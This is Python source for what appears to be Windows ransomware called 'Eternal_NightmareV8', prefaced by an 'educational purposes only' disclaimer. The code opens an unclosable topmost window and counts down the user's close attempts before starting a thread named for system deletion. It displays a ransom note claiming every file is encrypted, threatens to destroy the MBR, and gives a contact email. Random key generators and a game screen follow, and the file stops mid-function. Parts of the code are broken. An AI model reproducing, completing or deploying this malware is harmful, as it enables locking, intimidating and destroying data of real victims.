#This code was created for educational purposes only,
#and I am not responsible for any damage caused by abusing this code,
#and it is my own responsibility. I don't want this code to be abused like a hidden tier
#And never run this program in a non-virtual environment.
#Information for decryption, such as keys and vector extensions, is not recorded anywhere.



#
#
#
#
#
#
#
#



from asyncio import subprocess #line:1
from bisect import insort #line:2
from cProfile import label #line:3
from cgitb import handler ,text #line:4
from concurrent .futures import thread #line:5
from fileinput import filename #line:6
from importlib .resources import path
from msilib.schema import Font #line:7
from re import T #line:8
from textwrap import fill #line:9
from time import sleep #line:10
import threading #line:11
from tkinter import messagebox #line:12
import tkinter #line:13
from tkinter .filedialog import askopenfile ,asksaveasfile #line:14
from tkinter .ttk import Labelframe #line:15
from traceback import print_tb #line:16
from winreg import REG_RESOURCE_REQUIREMENTS_LIST #line:17
from tkinter import *#line:18
import time #line:19
from getpass import getpass #line:20
from Cryptodome .Cipher import AES #line:21
from Cryptodome .Hash import SHA256 as SHA #line:22
from Cryptodome .Random import get_random_bytes #line:23
import tkinter .messagebox as msgbox #line:24
import tkinter .font #line:25
import tkinter .ttk as ttk #line:26
import glob #line:27
from http .client import ImproperConnectionState #line:28
import os ,random ,struct #line:29
from re import A #line:30
from turtle import goto #line:31
from Cryptodome .Cipher import AES #line:32
from ctypes .wintypes import MSG #line:33
from Cryptodome .PublicKey import RSA #line:34
from Cryptodome import Random #line:35
from Cryptodome .Cipher import PKCS1_OAEP #line:36
from winreg import *#line:37
import sys #line:38
from winreg import *#line:39
import subprocess
import shutil #line:41
import hashlib

from Resource.Eternal_NightmareV7 import AESkey #line:42
nmys =Tk ()#line:49
aa =None #line:50
sf4 =None #line:51
aos =os .getcwd ()#line:52
aioss =aos .split ("\\")[2 ]#line:53
aiosss ="C:\\Users\\"+aioss #line:54
nmys .title ("")#line:55
nmys .geometry ('1000x600-800+300')#line:56
nmys .resizable (width =0 ,height =0 )#line:57
nmys .configure (bg ="black")#line:58
nmys .wm_attributes ("-topmost",1 )#line:60
nmys .overrideredirect (True )#line:107
font2 =tkinter .font .Font (family ="Consolas",size =18 );#line:61
font3 =tkinter .font .Font (family ="Consolas",size =14 );#line:62
font1 =tkinter .font .Font (family ="Consolas",size =19 );#line:62
font4 =tkinter .font .Font (family ="Consolas",size =16 );#line:62
akill =0 #line:63
def delsys ():#line:64
    import subprocess #line:65
    global akill #line:66
    akill =10 #line:67
    time .sleep (0.5 )#line:68
    OOOOOO00O0OOO0O00 =threading .Thread (target =batfb2 ).start ()#line:69
yo =4 #line:75
def on_closing ():#line:76
    global yo #line:77
    global akill #line:78
    if yo ==4 :#line:79
        yo -=1 #line:80
    elif yo ==3 :#line:81
        yo -=1 #line:82
        messagebox .showinfo (":)","I think you made a mistake :)")#line:83
    elif yo ==2 :#line:84
        yo -=1 #line:85
        messagebox .showwarning (":(","This is your last chance, there's no more chance, think carefully :( ")#line:86
    elif yo ==1 :#line:87
        yo -=1 #line:88
        messagebox .showinfo (":D","You turned down all 3 chances I gave you :D But I'm happy I got to destroy your computer!")#line:89
        messagebox .showinfo ("good bye","It's been fun so far. Goodbye and see you later!")#line:90
        messagebox .showinfo ("surprised?","Actually, it's all a lie. You activated the secret code. From now on, I will restore all your files :D But don't touch anything during the recovery, otherwise your data may be corrupted!")#line:91
        time .sleep (0.2 )#line:92
        delsys ()#line:93
    else :#line:94
        messagebox .showerror ("None","The nightmare has already begun, you can't stop")#line:95
nmys .protocol ("WM_DELETE_WINDOW",on_closing )#line:96
canvas =Canvas (nmys ,width =570 ,height =274 ,bd =0 ,highlightthickness =0 )#line:97
canvas .place ()#line:98
lb =Listbox (nmys ,width =110 ,height =30 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:99
lb .place (x =0 ,y =50 )#line:100
lb2 =Listbox (nmys ,width =30 ,height =30 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:101
lb2 .place (x =780 ,y =50 )#line:102
scrollbar =Scrollbar (nmys ,orient ="horizontal",command =lb2 .xview )#line:103
scrollbar .place ()#line:104
e1 =Entry (nmys ,width =51 ,text ="Option",bg ="black",fg ="red",relief ="groove",font =font2 ,bd =4 )#line:105
e1 .place (x =0 ,y =550 )#line:106
def key_generator (OO0O0O00OOOO00OO0 =32 ,OOO0O0OO00OOOO0OO ="v_GbjBb9ZnD^&!AeY3Cp35GFD5TscaHeG4ZvFzbA**Uwn3hRe%j!CTd%2E#CR3X%7bb8QC8b^eYVaCm^Y6UHDFArQxQfNXdF6+WX7Gj8uEgU8!aE2wMgN+D!uC^fw$FBtayc$Z4!Dybdduaf!tqWHryg#&nTVf%vpYfVwR&@CjgEexRjfv5@3jCT4CsXqqA3zdU3qv4=eeuR_PJ%WS@v4WUtA@bwA7KrMH2Ke8bCJnq$J?nAmAQpBEp&zJWBG##2KTN4P?mXCYXPwGKjffzXwJwsqNgwA+rFBLmhvV3QvnYQ#vdMUYk_cnG8@fE9*!=S?eCv*^c?Dr-G&7ZXM#n%56=KA55gkF@!k&7DHrMzDMkNrgS#v$T$yBF2mZBuh-p_h-N7NEkU7-yj53D2+qBgd^dbx6QHYAw9pJrV&-#JZjs#@Le&rUSk3nqWKE%$q6q&J^2TEEnRxqa7@6w_m8tab!j^sSxwQA3Ed@@3b3@!6LyX$e56hsnBZhUMhfrVG8pgCEts%+nrSbv$?cXpkL2MSWmVh_VSfDHTDTLF@RTx63cfWVfjn22wvu+u8Yv-%mf4V@78yQvp49tQZTnGhCvGp#QH#a-r^5fY-vH*WZ_qe6=aN?r$A9+5!b=jx-%yVQw?ETZN*M+hZB#=Wg&5rK-?-#W*xcmdXL+NC2Z3&A6yJ$GG#ApH$4UsJ7NuEeaK=QVk&mSwNj?%gmdQhmjGE=Y7%m^wb?8?ZwypDFbcJuyNvtSW+!KnLv^WA^KYbXu86LaHrK@wB+QXwA@K9k5XS-TQt7tp&X9jJ#drn8KEMXFw$$dg+xS#RtLH^mp3CpRZyMRUWcZe3jedpymZbjAjR=?YgDXGuz$fjs+SC%@vu*PxRE=4X*k96jX#2YHvDw8sH$6ZURC2*f2ac&f2EN7MapzZ-QJdnqv6*BqsxATHZp*RfXaKw28d$&Zk!44A#DE7rcr_GujKrG@3L94pV_5a+Efg#@pr&9T?Yh5ctq%L#yt^g-S4g@^WAz#ytVz4MyrM_y#P@@_#Jb8yDP3-+xU8pCnFS#hcK=rH5g=WCxBthHPF_%@kJyB7muxrsu_R$52$GtBg9hSn_adqYaRxyUXdp9EB*_mrhtkF2R@Dk=T&DyF-TCH+%UjyMb2V$*N_WKY=AVnrTCe*?xK!HtWChE*gy4E@=Q=69hrKtWuL5Rns&Tnze&XH?4KXp49@+MY&cBS%@G3_pBwSCN$SnLehwqE5Vgz2nWc!CTWPAB9eHMXPL^^Rgzs_8NG=nV4Q+$TkchdZbwe=5#G5BG!=xqfksd7MjWwkSX9FwgE=UGHxc=A_ZKkdFxD?fSSCfnZ%+FBsHFpCT_Paa%HsgmQRpTnr5qZ3?Wvhba-YkM5?2mWf7r3b$GBy^g4&W=jQ%XKNr!UyVmPNMbTn*f_7L=!y2A#KjmNcUVw#q#^NCNH$9n5xEe5MGaD6qpserZj-Fw7c5NAfWT=s7rhSS?F8tL?H977a#+uvdmyW-qnPyt@qde&$$U8C*?5qvXU5c8Wnh$tq3@emktf4mF##*a=ywttp4dFe3Pc3eyZ3m9s8FpQN?+pt%3^8vh4pGMah$52*mzG9N4A#3e#q_BqeRKx%2gFG^Mg$h$3+^rrQR8qN*7bSzTdW5K8$$mJFu9S4$d57_+&r_+xLkBcWY7mfXh#J@fy*Vs&uxLVnU?B8DXLe3&^uXSQ3mhsCcBzGE7=@58&Nkpb67g^K572Q93j!Umknhr+h6!HB8N6s-LcW6Qsx#e4NSfA=BT$VE4BCRrtPTa*MNtkD^_r8T?bSrCQ2=X8Np@Hx=@9NQG7G-9qU@3aHPg^b!cD&69^*YX^69emrn6LMpWbFx!tzkz+3C#3yTG5R^7%dzE^AWh!Chy=mK9j%Yb2Xj3NKL!dRPk@@c4w-za+-bEv6eMjhtug$LLHE_qs*#_mVkf9Y$RvHf&8kYjHTCdYDnzSAnKGk^PqsuYu%eeaU3##%tmYwc8KjmCEY!Sd?j3X*&?+JL=QKzPXd%bjZ@PHtHmEJPWf@&6SF4&VnE8^!eJXBazAc#8ZPmpTPz5M-rF3Q*XLuD_YY@=P?8C#%DYB@b?z-6Vhd?FTyDb=ws4?YC$-f58=*fdCMZs3j^e7Q92peB$bp2Hyu2h%+vAu#LS4h#Tv^j*=g@cZ+H5@h$G_hu35Ej3s$-fRUueqAGAQMTfsuUCaX9Z6cm-gJYw=@F9_8A!APA3dR!!LpLjYSMM-!@pJzpn*u74AxzQM_%gaP_wg$#^f$QNVT_*3-S#4+LnL3MQh*TuDu45uUe!g9h!*9$-^6HD#YqS_9d!&qMnf3cp+!nQ%26#3EMpbeDH9KWJe!TNfSa8&y3nnxrWg7LVgK_zbhb$jLuzpYQsXyq7U4gnQyzwE$+7VWQZ52vH5G*5B4crZBQVX#p+^?LQMH!_u&#G?$dVdDPS&_Vep#fWdK6pr6H_Q?sEPYmgj3c-H5$fVU!5Z3WQecfeAm6vD+hF+EWhR8?48&HR=_cGu?&MtZphzU5!RD@n9BazLV9zVfA=d_jVMA9b^y==VXX-cj3E_75exG*j-u5+2tVYyc*fFBNhuaRY_vVF82%dW33dSaRs^nMSVPprbrXQ-p--e7%6MG9ryUWUT4k%s@-ebXA2PXPeqH*%bNqxK&QsYML7hN_na*r_!G96-s@6cZbTQjYky2UjLeZyCfQLGvfJtNnA*$3_8gu*QNM-PNR!7eEy6W-vs$gxDyckKm&v%zECwcfn4GgYnTmwKf2SYep%xQx*YuhhK=c=CJ2f6hWAQnw8penG&Z4Nn++Ngee^SEpPRg^HTdM*pHXtdB4xZE=Y2K6jp#2gs7+gW6VE+c6%3@2%EX+deYJsMkpqN$QJ^g+%vSUF?wh@WgLQZVpKfkb_MzXc*zRZ-bkWH*F3vgMnN67W55X^G#QyUZrxFGWV6=fxQ#e#v?yRFjQZfXf^XP3MG@+UF!E+kGyuPf%K9Ga=Wbkx7PfGYjwUt+B$U_ubbKt#JEY!wbFgs@KEbL#Tgggjz?ub=jN%Q6QwH#aKKAw2kw#4!_dLyZvbM5Sz4qtpJeGUjNtJYvSJZ$w@AKzr4xC#-K5eTDmXcqL#y_Z#&59bL7cdVZfsv?yd$Gt-_DNyGeGQqxubDUQTt9KNu^_ybUTKkaevTsrP*pRzM=n#M6K4@X&%F4x$JeUTa@69#+&%wW%GTJz93v9+^DF6es6tGwdZbTrM=q9CNXe3Rs_V!wY-QS+TAW5PX3gffYfYJzA=g+RNuDMd#W7y*!sWc4XP8Dm=TWWYqn7A@K#8=8J+s8WMCxJDgBc7QjFtK4MWQ_66yf#Xj=_L2VVT-5U-6wenV@cXTM_fKtMP@-MmJ!GWrM646Q=H-aThGUav266kUXE_ZC^^%YV$QfNS*WV@r_txUkYshdZ4byCkU$!rycU$b?p9SeHqQg@g5unf#Z3a_QW54n!CTK!W^GzzvQjYbq8WcNRQMtRgZQg+GAxPWe3Fh4ZEPcjbcUDY#WY+MhEQBAh*t4Q2=e2QMGanNSzn%S&Az2?DzJHKQ#x*6DPqTJ_K-VZve5LJpztsF?2H@mUx$s#&?Z8FCQ3m@3aRxMJ&HaT*b&%Pg-sEW-?9f%n6Z2Kwku+bZGYr45_Q3BGbNj-a_ERQ9&Lxh8yGWh6yGDfu9&NR39NB&VDC%Hz=k#LWH57+%&*s-R7rWEgfsbN$-g!T+y?3@g+&@qS-bVZvF_$je-k$CKM9Zf#A6eP!XP!Ev^F_Z6_bsKuW!hDFNkLxX7R%d-V9h?FaLMEygpHPKs3f@eSet3etM^%^tNavbNFb4gfb**QYp#A4@UgJqkmABnL9zq8TExQ4F4d?zRmDE8Ras=rr49aD-E7L&CY*V2?7M6?3+27THuWWBkzfkxVrHn@a8bebeuMNt8*tAG*YGdL!c@BPryvcuxXM%jKdcB@h&fap9GFa@7Y3!Ekvb@Fr&AEegGuYRd@x+W%%QbZf4ga2aNRPVpTn!cyB3f+Q3AWZSHvYy5#_b@L!W94+4Mh@^fZQUkTs?zXRmgRK#c#9p*xf9@pUgdz4k@YNKk@5eBrSgXyCPM$jts?2J94R7PuA!-VcuU@ZYeK?J&wuGw2GfY?LW#rGkefQZw?sR=uScYc=5+NR5n5Jf?K#qd#yjkZNcg!JmLt=-RTjN=^5uRqcwxgu7ESM%rjBPz!Te*NFb=rx^G5r$hYXYRf@$JTB?M#z5-p3#vgcdzn4Xz9Kh67Fp%Cdzd2F4*!uMuLw=Sv!%8hYSj?KMPA2J_nUcG$zg#Jm%rSbV8=N4PZR6=ftGKt2Lw4-r_^A6fV5sFv8QDEbpE?G##!eQ$aqu*ZxX+4ruYXfBL_h$nMsJYWa4W@q4#&3xuHC&-Vm5q$PVQYzd=nzGcjFhnYdSMJUWAqSaeHbesZSeDex+7vZbLY&f*C6kC@GV!rWj4AhFU4ktmhyBzrp_wyC_$=bVW%@M*+#LFQ9Z4h?rL6^A3-FE+Q^jhR2cc@A!ccG%FayF3gV_SL&Hk2hf47!njRN&prTN2?PxXLXA-Tda+?g-vhj=m8-fypG4V=2L5Pd!pg4nDSejPAyMc%jBcMc+=PfU=CQpEgYS69r&a@VM=cQUThw&$3mPa@m-Fgs@#Rr8%$-fh*unC#*M^%@Hw7uEvdYYqAP5zQGaurFVn8N=!u#DUcLrEnn38Upu#u-QXAUx8UgH_cw+%8&q4Fk2VrcTRK#-e7&sbud4mNuvQR4F$7T!qNphK9UTZVGDS9^NH86tRtDQcCucwzsh%PnC5*PZcnnFkV?mjJh9LA#VBp7DZdZ@22rrw4XhATN9!bGzEeQPE7%fj@VWQHS=88hEHgbD8rVH@ZzjTb6gzBVGe25rxNW9SPHF5ptnTe5Z&YUeM3*+b9AXNe8@$rwxgAxeXZgMVJehgtX2!pJFT%RWr9749e5?cC$9c#*eTp*Htg@sLsypY!VF^hXUrV@g%N=u6e+N4sLPL+xJ@N@4SRnF8TRH!Lrh+3cp6?MzU%@mDHQ9Cd_@u4gb@3P5faXuP5BgYG*dLgNS@J@xy&+ujpsEQK&HKeXUKYNQKvP7Z^Ck#sueeG=7nCAyVHCmV&eK!s=Ysnfhy!q6!yZkQhXZbc3N-=XGvSZttD+!jB7!_&4-5Za@x#WK65rk6xwEzjvyvGCCcMcTLUmFQf*xb+qjBT!A7L#aRfX5&G@GL%_F!4%hW_tdsF?PX!$PBcX&a74Q#bBwQBd-6W@S9dq&TTE&&&9$H5WhT-@%Z$%#-SHmR8Q@K85Cuc?@tCnhG=TTt34bt$HXxy-DyFtP?VgpqW+X9$ZwATcjfX9Nyq@pR*pbtnP@3EUV^tnm@yhF#NsjJPAhZj$?!6%Z@xrmu=+5=z=Ba+$TG_USS8+hdLN+JcFUw8Q^gts3m$QX2!xqr7HcPNqVk3Fq+FMhk2^+UMvz9^jKHV4-N$xtThrmW?-xTgVuvt!?va$REQD$+-KMA48vSE6a@U&s72zk?GX3LpP=D-j_B&43YL#Fb*ps6ChejR#BKWz+52qdhw9+WLeFBz-jHabJKY9u$3xHHy=58_9tJC+XRDYY9T=Pbf?KWkz3ENQKBwz?td$Gs8Kc=tC8$hdk2XqvGr@G&D?=BbXR7GWJK_&w?HV*$N5EZe$F%Z_p2TH_?hZznPXKF#w_-rd!m!c2-grB6V%va6Y@A&P&mkX^VJa7K-AHkaVKAbnwRuq$xgNe^*d8m3xgTSxgUvX5_bF343R4=hTWmgY8e+bP98v53Dw#_v5_6Sty8PVRTmhsGRu@RR8z7U+gr@VxvgG6dSZ*fvta2p3ZuGz_JfR*QVh^bA%#N^?n@swADMXu_f+X&hcpRm+pDu%y-CNMM*_%7P&#&6&mafs&yD_V5gqC7NMEw6caf_?d*B2V&MX4WueAs_#h&@mj&cAt*YwcuEua^^%QFhPM-a98heWbRB-yQ#gSZLbJ983+WADVF4yQckAV2Zj-=ubd^j!fdQ!FA4mgUxGb+b+Up!3_4jL@PUMtxDGh!jbrCPSf9Y7JFpNAMqTupF*5A$kYf=DMANSLKwNs-%WdyZqW4Yz%&3vfE$xeA7LDpx48s7TU8mYRbF9eH98Tb#Qy4TK*6MN+uV6+3F+QSDAj9CWzmmDbFS2=t@d3Ynsj6TjtVpEn^W4$uMT*NC7dnR&$rs$a=C*KnKHz-xcpRje4TtseWZqQ9Kt6F^w7wCh9uy23E?XgT-nzm=+K4qYvZ@A9PWQwSua_#RU$dg*XzFBb9^&HK8zQv++ZcMRgH9uhmfk@z#c4*gJ9AK$M2n4zG%GscM%X6PNQsbVSgzkmLq-4_!Vzn4fK%*!3WaWdz?y5mAA#=xAbJXq*SpH&Wd5?qgM%+q5^sn*5KqxFpJYED2KX5?PeXLtV-6zA_KD8xKu=4c_@Nu*m=KQ2$veWM+WU9t?@f@W7ATufgL*gb2_S&CH2sfLJ=MURBd?EF^Tx&8@jM4v9h_n?N&@q3ckFu%&+qF4QvA6qZHBkatvGL*Zg!sF&@QE-TV6zJ2h*hqwxU@A-Q&zhnkgg*BExxHq#7Dh8+gZteCK&M?YKRh2Ye$vQB6c%3uq6@9zL=+Mn4araUY+FaZ3=QTMPyW!37^nLR@^LGNGEe&=aT?N_HU+gtn#h?t_9LFwd#jF3PzY7FffQCfJZZ^zSwz&YF2XQP?G9CBu5?m4C&xjg8F%f?VmfNf34j^msM4N3SF+rGZNt&*zp$5??xzZA!ceXe2wD5FyVB@Ac_#y-jaPB-Gu?#zm$yU6&xHTxFc=zZEVGy-DF7VGnTb#Kpsqzr$K6urH*BT=9Nke??$6m*HwYc2*mV!9L_^J%SuYLsA8kLf?5ZN8baQ+u5ZD3-4dDEHxeZ-T%HE=z?vx$&9*dTUg!-97PQ*sLmwjkP6^A*+Rb*wLxDud@Hm+Mh&SabMTNWZGPDWWAa$MJmas!H7jW@JFVJeu4D!#N7?b#V%Q=3hdAgWMN63W!6apbWM=DxcLBL=MxR9EDv+K^6_A%xHf_uq9zc_JQ6CXPWHCDLt*J*Cn-VzFZ#8B^FEqwzPu6m^CTWTRH3-PpH!cqdd9KT__N&$RGRRPwkwrfQc98YPQF8WR-nhArfVjh#7y5tJ4jzSkFEmvJfqp%u8BhL&TVATs2DkYUvMcG9ET8Avg#ZrMuUJ4r979a=y5$bG9n@gT^_J$ZG+X9^LEh@_x#H4sHQF-GV73?AF*P!^VDs4ux5eGkCCa2Z=@3E*!B^7Y8%!hYvbPghspjV=vVKK#*BX_*JV7LcLWACh6^@^!Ww5Py$Bv+Z=FyqZ#3b@yRDckNz=*-!T_uMtYcd#uBs#+g#=5d27GMVJt8sERA5d7Z+hZ96kn4xhDG_wkEQ7ShvcqAWRSbgpY&Ebd^DC#7XxMx4^Ajcp*+H3mEA$9vU8-7b!=93amyKv%!jkDh#DejYtgfzt+mNn@-9E!Jp9?sEzVhcHw4e5vg86YsdJpD?58tDRZqMa3KeA#%FmEjH*fV-hq@h%mHsRrbx&n%K5Z-aM?Y8@v5jx-ZyyXA=wjbHac!-d4q^HTe*$qhTf*Cd7%&4^5q-=@UtLFNP@#YxFYeZ-khJG-Q8gus#A99dZq4A3QBTxDFxYW5gW-@gdEF^WZUQ^Z*QUAcxKjR#57$K8an3ugh6AuJPP9H5!QYqy!Eck68RQg4?X#vfpCkAQd&yMp9bqY!takQ^7?dgn==cz8TvqXbV=bK3WY396K389Z#G#jUE?Ed%9dMHXNf7uaZsXejxULxZQxvNme&5mTrT=Sy3vC4-VJ=_DXRyZ5Z&hMWyw+NKY?Gf8EG8YMmn54gfkWZATfJm&3ABjTgyT_z%^Q4Z#4N@mPG!drCXRLmX$RMWscA6KadnuVe@GRMQcWr6jFWfCbfzStbQNXSGy5@euNTwJ4$hA5%Ccjv*eDBLv@^-vk+$gx#PjY6tXQXf2W%C+$jwqrqwjjzffte%L7s8sXajZqX6nMg6KtPF^uKGVKQYY?KyZr^p7S+%c6-aXbCmaPnqSpLTDQN*NKQ-J&T&ERqyyVM_?f!uWMqz&dnZJ3e5VFvKeJKW*B*qC#FpDCfXmbexUSLpSAEE7ZJyawW*ERUY&MLZZM$ZknTfP+4q84cg-fcXfSFTsa=PR2urbE&yQxmW7&E_eD-g%bDM+t3%MubRMTkhc%9C9!*pZFXbYDHB%ndCuM#6Ma=aC+TjA@Az-Y=*+dMkDyauK#P!4c47GzX9Dxha6v?Enm@=nwQ$7VNNVs8+BH*XahXz"):#line:108
    return ''.join (random .choice (OOO0O0OO00OOOO0OO )for _O000O0000O0OO0O00 in range (OO0O0O00OOOO00OO0 ))#line:109
def key_generator2 (O0OOOOO0O00O0O000 =64 ,O0OO0OO00O0O00O00 ="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"):#line:204
    return ''.join (random .choice (O0OO0OO00O0O00O00 )for _O0OOOO0OO00OOOOOO in range (O0OOOOO0O00O0O000 ))#line:205
def msgb ():#line:111
    lb .insert (0 ,"")#line:112
    lb .insert (1 ,"If you close this program or try to reboot your computer,")#line:113
    lb .insert (2 ,"this program will destroy your computer's MBR system and destroy all information!")#line:114
    lb .insert (3 ,"Be careful not to turn off this program")#line:115
    lb .insert (4 ,'')#line:116
    lb .insert (5 ,"--Q:What happened to my computer?")#line:117
    lb .insert (6 ,"--A:Hello! new victim? You are infected with Eternal_NightmareV8 ransomware We inform you that all your files are encrypted.")#line:118
    lb .insert (7 ,"--A:All your files are encrypted and protected using a strong military-grade encryption algorithm using random keys, random vectors, and random extensions!")#line:119
    lb .insert (8 ,'')#line:120
    lb .insert (9 ,"--Q: How can I get my files back?")#line:121
    lb .insert (10 ,"--A: Other ransomware will restore the files if the victim pays them, ")#line:122
    lb .insert (11 ,"    but I'm different I was developed solely for the purpose of destroying the files of the victims :)")#line:123
    lb .insert (12 ,'')#line:124
    lb .insert (13 ,"--Q: Can't really recover my files?")#line:125
    lb .insert (14 ,"--A: If you really want to, please report to the developer's email that you have been attacked by this ransomware,")#line:126
    lb .insert (15 ,"     in some cases it can be restored :)")#line:127
    lb .insert (16 ,'')#line:128
    lb .insert (17 ,"--Q: Please provide the developer's email")#line:129
    lb .insert (18 ,"--A: ewgsghse@gmail.com this is the developer's email :P")#line:130
    lb .insert (19 ,'')#line:131
    lb .insert (20 ,"**Developer Says: Just Enjoy! This is a terrible nightmare that will never end!")#line:132
    lb .insert (21 ,"But if a lot of people really want their files to be recovered, it might end someday!")#line:133
    msgbox .showwarning (":D","warning! You can turn this program off if you wish."+"\n"+"\n"+" However, if you close this program, the key value stored in the program's volatile memory will be lost and your files will be permanently destroyed!!"+"\n"+"\n"+"So I do not recommend that you turn this program off")#line:134
    msgbox .showwarning (":D","You have 5 chances to enter the key, and if you enter the wrong key more than 5 times, all your keys and vectors will be destroyed immediately and you will never be able to recover the file again. Please enter your key carefully.")#line:135
def load ():#line:136
    lb2 .delete (0 ,END )#line:137
    for OOOO00O0O0OOOO0O0 in range (0 ,encflist3 ):#line:138
        nmys .update_idletasks ()#line:139
        progressbar2 ['value']=OOOO00O0O0OOOO0O0 /encflist3 *100 #line:140
        lb2 .insert (0 ,encflist2 [OOOO00O0O0OOOO0O0 :OOOO00O0O0OOOO0O0 +1 ])#line:141
        wf=open("Key,iv,extension","w")
        wf.write(AESkey.decode()+"\n")
        wf.write(key.decode()+"\n")
        wf.write(ivlist+"\n")
        wf.write(encflist3,encflist2,encflist+"\n")
        wf.close()
def clear ():#line:142
    lb .delete (0 ,END )#line:143
    e1 .delete (0 ,END )#line:144
    msgbox .showinfo ("Clear","Clear done!")#line:145
difficulty=0
point=0
def MiniGame ():#line:146
    global font2
    global font3
    global font1
    global font4
    gamewin=Toplevel(nmys)
    gamewin.title("GameWindow")
    gamewin.geometry ('600x450-1350+350')#line:56
    gamewin.configure (bg ="black")#line:58
    gamewin.wm_attributes ("-topmost",1)#line:60
    gamewin.configure(bd=10)
    gamewin.overrideredirect (True )#line:107
    lb =Listbox (gamewin ,width =60 ,height =18 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",relief ="groove",bd =4 )#line:99
    lb .place (x =-10 ,y =50 )#line:100
    lb2 =Listbox (gamewin ,width =20 ,height =18 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="red",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:101
    lb2 .place (x =440 ,y =50 )#line:102
    l=Label(gamewin,bg ="black",fg ="red",width =10,text="Game List",relief ="groove",bd =3,font=font1)
    l.place(x =440 ,y =-7 )
    l2=Label(gamewin,bg ="black",fg ="red",text="Game Rules",width =30,relief ="groove",bd =3,font=font1)
    l2.place(x =-10 ,y =-7 )
    def select():
        s=str(lb2.curselection())
        if s.split('(')[1].split(",")[0]=="2":
            lb.delete(0,END)
            lb.insert(0,"the more difficult it will be and the higher your score will be!")
            lb.insert(0,"The more questions you answer,")
            lb.insert(0,"a score is given and the next question appears!")
            lb.insert(0,"a hash function and write it in the correct answer box,")
            lb.insert(0,"In this game, if you match a random string encrypted with")
            return 2
        elif s.split('(')[1].split(",")[0]!="0":
            print(s.split('(')[1].split(",")[0])
            return 0
    def GamePlay():
        if select()==2:
            def EXITGAME():
                gameplay.withdraw()
            def hashasnwers():
                global answer
                global hashasnwer
                answer=key_generator2(2+difficulty)
                hashasnwer=rndk(difficulty,answer)
                lb3.insert(0,hashasnwer)
                lb3.insert(0,answer)
            def chacksum():
                global point
                global difficulty
                answerchack=E.get()
                E.delete(0,END)
                if answerchack==answer:
                    lb4.insert(0,"Congratulations! That's right! Score added!")
                    lb4.insert(0,"Your answer:"+answerchack)
                    point+=difficulty+1
                    difficulty+=2
                    lb4.insert(0,"Difficulty increased!:"+str(difficulty))
                    msgbox.showwarning(":)","Congratulations! That's right! Score added!")
                    msgbox.showwarning(":)","your answer:"+answerchack)
                else:
